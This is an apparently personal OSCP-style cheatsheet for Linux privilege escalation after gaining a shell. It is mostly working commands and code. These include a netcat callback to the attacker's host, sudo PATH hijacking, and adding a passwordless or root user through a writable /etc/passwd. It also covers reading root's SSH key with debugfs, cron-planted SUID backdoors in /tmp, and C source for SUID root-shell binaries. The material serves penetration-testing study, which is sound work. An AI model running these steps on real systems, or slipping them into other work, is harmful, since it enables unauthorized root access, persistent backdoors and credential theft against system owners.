---
title: Linux Privilege Escalation
date: 2020-06-29 16:33:08
tags: [oscp, linux, cheatsheet, privilege escalation]
---

# Linux Privilege Escalation Cheatsheet

So you got a shell, what *now*?
This cheatsheet will help you with local enumeration as well as escalate your privilege further

Usage of different enumeration scripts are encouraged, my favourite is [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
Another linux enumeration script I personally use is [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
Abuse existing functionality of programs using [GTFOBins](https://gtfobins.github.io/)

*Note: This is a live document. I'll be adding more content as I learn more*

## Unstable shell
Send yourself another shell from within the unstable shell
``` bash
which nc
nc $ip $port
```

## Make it functional
Necessary for privilege escalation purposes
``` bash
which python[3]
python[3] -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
# In Kali
stty -a # Notice number of rows and columns
stty raw -echo && fg
# On target system
reset
stty rows xx
stty columns yy
export TERM=xterm-256color
```
## General info
``` bash
# username, groups
id
hostname

# Part of too many groups? Find out all the files you've access to
for i in $(groups); do echo "=======$i======"; find / -group $i 2>/dev/null | grep -v "proc" >> allfiles; done

# Interesting internally listening ports?
netstat -anpt

# Look what the user was up to
less .bash_history
less mysql_history

# Check user accounts
cat /etc/passwd | grep "sh$\|python"

sudo -l
```
## Automated enumeration
``` bash
# Automated local enumeration
# Look for any highlighted stuff
# Cron jobs
# Non-standard scripts or programs
# Hardcoded credentials. Check password re-use against existing accounts
./linpeas.sh -q

./linenum.sh
```

## Abusing sudo
Can sudo but absolute path is specified? Use `ltrace` to view libraries being loaded by these programs and check if absolute path is specified or not
``` bash
# Easy win?
sudo -l # Check programs on GTFOBins

# Can sudo, abosulte path not specified?
echo "/bin/sh" > <program_name>
chmod 777 <program_name>
# Export PATH=.:$PATH
sudo <program_name>
```

## Weak file permissions
``` bash
# Writable /etc/passwd?
Remove 'x' beside a username --> no password
# Create a new user
openssl passwd "lol" # Prints out a hash
# Make a new entry at the end of /etc/passwd
notahacker:$passwd_hash:0:0:/root:/bin/bash # Become r00t yourself

# /dev/sda1 readable?
debugfs /dev/sda1 # Get root's SSH private key 
```

## Abusing CRON jobs
``` bash
# Writable CRON program?
# Insert language specific reverse shell

# Writable library?
# Back up library
# Insert language specific reverse shell at the end of the library

# Make root give you a bash SUID program
# Make getroot.sh file with following contents and wait for CRON job to run the program
#!/bin/dash
cp /bin/dash /tmp/backdoor
chown root:root /tmp/backdoor
chmod u+s /tmp/backdoor
# Execute /tmp/backdoor to get a root shell


cp /bin/bash /tmp/backdoor
chmod 6755 /tmp/backdoor
# Execute /tmp/backdoor -p to get a root shell
```
Use a suid program and use as per context
getsuid.c
``` c
// BOTH WORKS
// gcc -o suid getsuid.c
// AS INTENDED USER - 
	// chown root:root suid
	// chmod 6755 suid

// immediately spawns shell upon execution 
int main() {
	setuid(0);
	system("/bin/bash -p");
}

// or better, execvp doesn't drop euid
// able to handle more things without any modifications
// run commands as root
#include <stdio.h>
#include <unistd.h>

int main(int argc, const char * argv[]){
	if (argc > 1) printf("%s",execvp(argv[1],&argv[1]));
	return 0;
}
```
## Abusing wildcards
Check out this fantastic [document](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) of a talk
* Abusing `chmod` 
* Abusing `chown`
* Abusing `tar`
* Abusing `rsync`

## Abusing NFS < 4

Refer to my [personal notes](https://www.notion.so/NFS-4-689ff63036654c3f8e3bda2deef9f6e5) for exploiting NFS < 4